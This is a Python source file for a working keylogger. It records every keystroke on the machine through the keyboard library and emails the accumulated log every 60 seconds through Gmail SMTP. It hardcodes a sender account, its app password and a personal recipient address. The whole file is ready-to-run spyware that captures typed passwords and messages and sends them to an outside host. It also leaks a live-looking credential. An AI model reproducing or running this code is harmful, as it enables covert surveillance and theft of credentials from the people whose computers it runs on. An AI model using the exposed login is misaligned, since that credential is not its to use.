import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart


SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
# mail server parameters
EMAIL_ADDRESS="key.logger.automated@gmail.com"
EMAIL_PASSWORD="zvhpkhqpnczsxdiw"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "

            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
                
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        if name!="[BACKSPACE]":
            self.log += name
        else:
            self.log=self.log[:-1]

    """def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[
                           :-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):

        open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")"""

    def prepare_mail(self, message):

        
        fromEmail = 'key.logger.automated@gmail.com'
        mailSubject = "keylogger logs"
        recepientsMailList = ["iheb.yaakoubi@sesame.com.tn"]


        msg = MIMEMultipart()
        msg['From'] = fromEmail
        msg['To'] = ','.join(recepientsMailList)
        msg['Subject'] = mailSubject
        msg.attach(MIMEText(message, 'plain'))

        # after making the mail, convert back as string message
        return msg.as_string()

    def sendmail(self, message):
        smtpHost = "smtp.gmail.com"
        smtpPort = 587
        mailUname = 'key.logger.automated@gmail.com'
        mailPwd = 'zvhpkhqpnczsxdiw'

        fromEmail = 'key.logger.automated@gmail.com'
        recepientsMailList = ["iheb.yaakoubi@sesame.com.tn"]

        s = smtplib.SMTP(smtpHost, smtpPort)
        s.starttls()
        s.login(mailUname, mailPwd)
        msgText = self.prepare_mail(message)
        sendErrs = s.sendmail(fromEmail, recepientsMailList, msgText)
        s.quit()

        # check if errors occured and handle them accordingly
        if not len(sendErrs.keys()) == 0:
            raise Exception("Errors occurred while sending email", sendErrs)


    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            #self.update_filename()
            if self.report_method == "email":
                self.sendmail(self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            #print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()




    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        #print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()




if __name__ == "__main__":
    # if you want a keylogger to send to your email
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
